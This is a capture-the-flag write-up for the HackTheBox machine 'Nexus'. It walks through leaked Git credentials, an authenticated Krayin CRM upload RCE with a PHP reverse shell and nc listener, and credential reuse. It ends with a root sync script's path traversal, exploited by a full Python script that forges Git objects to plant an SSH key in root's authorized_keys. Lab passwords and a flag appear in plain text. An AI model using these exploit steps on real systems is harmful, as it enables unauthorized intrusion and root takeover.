Nexus

HackTheBox · Easy · Linux

Overview

Nexus was an easy Linux box. Vhost enumeration turned up a Gitea instance and a Krayin CRM billing portal. Recovered a leaked .env credential from Git history, reused it to log into Krayin, and Krayin turned out to be vulnerable to an authenticated file-upload RCE. From there, LinPEAS handed over another set of creds that got reused over SSH, and a root-owned systemd timer syncing Gitea templates was the final piece — hand-crafted some Git objects to smuggle a path traversal payload into root's authorized_keys.

Recon

Started with a service/default NSE script nmap scan, as with any box.

nmap -sC -sV 10.129.89.114

80/tcp open  http    nginx 1.24.0 (Ubuntu)

Then searched on searchsploit for nginx and OpenSSH, but nothing was available. Decided to review the website.

Enumeration

Nothing seemed of interest on the site, with the exception of this particular email: j.matthew@nexus.htb. It looked useful and could be used for later.

After running a gobuster vhost brute force, got some further useful findings. Added the domains to /etc/hosts.

gobuster vhost -u nexus.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

Billing then takes us to this admin login portal — Krayin, an open-source CRM.

Git page takes us to a git service. found there was a link to a git repo.

Upon inspection, some credentials were found, but not anything particularly of interest — the DB_PASSWORD field was blank. Decided to git clone it to see if we could retrieve any credentials that might have previously been in the git repo.

git clone http://git.nexus.htb/admin/krayin-docker-setup
cd krayin-docker-setup
git log --all -p | grep -i "password\|api_key\|secret\|token"

Credentials were found!

-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=

Foothold

Decided to use the same password using the j.matthew@nexus.htb account.

Credentials worked!

Upon searching the version of Krayin, it seems this version had a CVE — CVE-2026-38526 / EDB-ID 52629, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a .php upload, and uploaded files land directly under the web-accessible storage/tinymce/ directory — so any authenticated user can upload a PHP web shell through what's meant to be an image uploader, then just browse to the returned path to get code execution.

From here, downloaded the python POC and ran it against the billing subdomain with the payload being a PHP reverse shell by Pentest Monkey.

python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php

nc -lvnp 4444

Got a shell as www-data.

Privilege Escalation

Then decided to run linpeas.

Linpeas returned credentials. Tried sshing with those credentials for the krayin user, but had no luck — let's try jones.

ssh jones@10.129.89.28
cat user.txt
8a3fdb05504c0a99754de6b9dee757e0

It worked with jones! Here we get our user flag.

Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need — a systemd timer, gitea-template-sync.timer, running /etc/gitea/template-sync.py as root. The script walks any Gitea repo flagged template:true and copies its tracked files into a staging directory.

Below is the vulnerable code:

import os  
import sys  
import json  
import subprocess  
import time  
import urllib.request  
  
GITEA_URL = "http://localhost:3000"  
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"  
STAGING_DIR = "/home/git/template-staging"  
LOG_FILE = "/var/log/template-sync.log"  
  
def log(msg):  
    ts = time.strftime("%Y-%m-%d %H:%M:%S")  
    line = "[%s] %s" % (ts, msg)  
    print(line, flush=True)  
    try:  
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)  
        with open(LOG_FILE, 'a') as f:  
            f.write(line + '\n')  
    except:  
        pass  
  
def load_config():  
    config = {}  
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:  
        try:  
            with open(path) as f:  
                for line in f:  
                    line = line.strip()  
                    if line and not line.startswith('#') and '=' in line:  
                        k, v = line.split('=', 1)  
                        config[k.strip()] = v.strip()  
        except:  
            pass  
    return config  
  
def get_token():  
    cfg = load_config()  
    return cfg.get('GITEA_API_TOKEN')  
  
def get_template_repos(token):  
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL  
    req = urllib.request.Request(url, headers={  
        'Authorization': 'token %s' % token  
    })  
    try:  
        with urllib.request.urlopen(req) as resp:  
            data = json.loads(resp.read())  
            repos = data.get('data', data) if isinstance(data, dict) else data  
            return [r for r in repos if r.get('template', False)]  
    except Exception as e:  
        log("API error: %s" % e)  
        return []  
  
def sync_template(repo_info):  
    owner = repo_info['owner']['login']  
    name = repo_info['name'].lower()  
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)  
    stage_path = os.path.join(STAGING_DIR, owner, name)  
  
    if not os.path.isdir(bare_path):  
        log("  repo not found: %s" % bare_path)  
        return  
  
    # Read tree entries from the bare repository  
    try:  
        GIT = ['git', '-c', 'safe.directory=*']  
        result = subprocess.run(  
            GIT + ['ls-tree', '-r', 'HEAD'],  
            cwd=bare_path,  
            capture_output=True, text=True, timeout=10  
        )  
        if result.returncode != 0:  
            log("  ls-tree failed: %s" % result.stderr.strip())  
            return  
    except Exception as e:  
        log("  ls-tree error: %s" % e)  
        return  
  
    entries = []  
    for line in result.stdout.strip().split('\n'):  
        if not line:  
            continue  
        parts = line.split('\t', 1)  
        if len(parts) != 2:  
            continue  
        meta, filepath = parts  
        mode, objtype, objhash = meta.split()  
        if objtype == 'blob':  
            entries.append((mode, objhash, filepath))  
  
    if not entries:  
        log("  no files in template")  
        return  
  
    # Extract files to staging directory  
    for mode, objhash, filepath in entries:  
        target = os.path.join(stage_path, filepath)  
        target_dir = os.path.dirname(target)  
  
        try:  
            os.makedirs(target_dir, exist_ok=True)  
            GIT = ['git', '-c', 'safe.directory=*']  
            cat_result = subprocess.run(  
                GIT + ['cat-file', 'blob', objhash],  
                cwd=bare_path,  
                capture_output=True, timeout=10  
            )  
            if cat_result.returncode != 0:  
                continue  
  
            with open(target, 'wb') as f:  
                f.write(cat_result.stdout)  
  
            if mode == '100755':  
                os.chmod(target, 0o755)  
            else:  
                os.chmod(target, 0o644)  
  
            log("  synced: %s" % filepath)  
        except Exception as e:  
            log("  error syncing %s: %s" % (filepath, e))  
  
def main():  
    log("Template sync starting")  
  
    token = get_token()  
    if not token:  
        log("No API token found")  
        sys.exit(1)  
  
    templates = get_template_repos(token)  
    log("Found %d template repo(s)" % len(templates))  
  
    for repo in templates:  
        name = repo['full_name']  
        log("Syncing template: %s" % name)  
        sync_template(repo)  
  
    log("Template sync complete")  
  
if __name__ == '__main__':  
    main()

filepath comes straight from git ls-tree with zero sanitization, then flows into os.path.join(stage_path, filepath), which happily walks .. sequences right out of the staging directory. A tree entry literally named ../../../../../root/.ssh/authorized_keys gets written to the real path and since the script runs as root, the write goes through.

Normally you couldn't get away with this as the standard git client refuses to let a tree entry contain ... git add, git commit, even git update-index --cacheinfo, all validate and reject it. The way around it is to skip the Git client entirely and hand-build the raw blob/tree/commit objects directly, since nothing at that layer checks path safety, only the porcelain commands do.

We then create an SSH key and make a API call to gitea to have a token created. We also make the token a variable we'll be using next.

ssh-keygen -t ed25519 -f /tmp/.k -N ''

curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
  -H "Content-Type: application/json" \
  -u "jones:y27xb3ha!!74GbR" \
  -d '{"name":"newtoken","scopes":["write:user","write:repository"]}'

We then make further API calls to create the malicious repo.

curl -X POST http://localhost:3000/api/v1/user/repos \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"rce","private":false}'

curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":true}'

Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into .git/objects/, chains .. tree entries around the authorized_keys blob, and manually points refs/heads/main at the crafted commit:

#!/usr/bin/env python3  
import hashlib,zlib,os,subprocess,sys,time  
  
def write_obj(data,t):  
    h=("%s %d"%(t,len(data))).encode()+b"\x00"  
    s=h+data  
    sha=hashlib.sha1(s).hexdigest()  
    d=os.path.join(".git","objects",sha[:2])  
    os.makedirs(d,exist_ok=True)  
    p=os.path.join(d,sha[2:])  
    if not os.path.exists(p):  
        open(p,"wb").write(zlib.compress(s))  
    return sha  
  
def entry(mode,name,sha):  
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)  
  
if not os.path.isdir(".git"):  
    print("Run inside git repo");sys.exit(1)  
  
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)  
if r.returncode!=0:  
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)  
key=r.stdout.strip()+"\n"  
  
blob=write_obj(key.encode(),"blob")  
readme=write_obj(b"# Template\n","blob")  
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")  
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")  
fir=write_obj(entry("40000","root",cur),"tree")  
for i in range(4):  
    fir=write_obj(entry("40000","..",fir),"tree")  
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")  
ts=int(time.time())  
c="tree %s\nauthor x  %d +0000\ncommitter x  %d +0000\n\ninit\n"%(root,ts,ts)  
sha=write_obj(c.encode(),"commit")  
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)  
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")  
print("Done: "+sha)

Initializing the local repo and setting the remote before crafting the objects.

Then run git push origin main.

git push origin main
